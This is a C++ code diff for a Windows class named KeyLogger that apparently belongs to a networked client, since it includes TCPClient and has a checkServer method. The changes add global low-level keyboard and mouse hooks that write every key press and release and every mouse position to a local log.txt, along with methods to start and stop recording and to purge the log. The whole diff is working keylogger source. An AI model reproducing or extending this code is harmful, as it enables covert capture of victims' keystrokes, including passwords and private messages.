@@ -5,6 +5,7 @@
 #include <string>
 #include <bitset>
 #include <iostream>
+#include <fstream>
 #include <windowsx.h>
 #include "Protocol.hpp"
 #include "TCPClient.hpp"
@@ -33,7 +34,9 @@ public:
 		if (m_keycode2name.find(kbdStruct.vkCode) != m_keycode2name.end())
 			key = m_keycode2name.at(kbdStruct.vkCode);
 		else
-			key = "Unknown key";
+			key = "unknown key";
+
+		m_output << "Client " << key << (wParam == WM_KEYDOWN ? " pressed" : " released" ) << std::endl;
 	};
 
 	virtual void onMouseEvent(int code, WPARAM wParam, LPARAM lParam) {
@@ -44,9 +47,9 @@ public:
 			mouse_button = m_mousecode2name.at(wParam);
 		}
 		else {
-			mouse_button = "Mouse move";
+			mouse_button = "move";
 		}
-		//std::cout << "Mouse " << mouse_button << " at: " << pt.x << " " << pt.y << std::endl;
+		m_output << "Mouse " << mouse_button << " at: " << pt.x << " " << pt.y << std::endl;
 	};
 
 	void checkServer()
@@ -78,21 +81,42 @@ public:
 		m_client = client;
 	}
 
+	void KeyLogger::stopRecording()
+	{
+		UnhookWindowsHookEx(m_hook);
+		UnhookWindowsHookEx(m_hook_mouse);
+		m_output.close();
+	}
+
+	void KeyLogger::startRecording()
+	{
+		m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); //Enable keyboard hook
+		m_hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0); //Enable mouse hook
+		m_output.open("./log.txt", std::ofstream::app);
+	}
+
+	void KeyLogger::purgeLog()
+	{
+		m_output.open("./log.txt", std::ofstream::trunc);
+		m_output.close();
+	}
 
 	HHOOK m_hook;
 	HHOOK m_hook_mouse;
-
 private:
 	MSG m_msg;
+	std::ofstream m_output;
 
 	KeyLogger() {
 		m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); //Enable keyboard hook
 		m_hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0); //Enable mouse hook
+		m_output.open("./log.txt", std::ofstream::app);
 	};
 
 	~KeyLogger() {
 		UnhookWindowsHookEx(m_hook);
 		UnhookWindowsHookEx(m_hook_mouse);
+		m_output.close();
 	};
 
 	KeyLogger(const KeyLogger&);                 // SingleTon Cannot be copied copy-construction
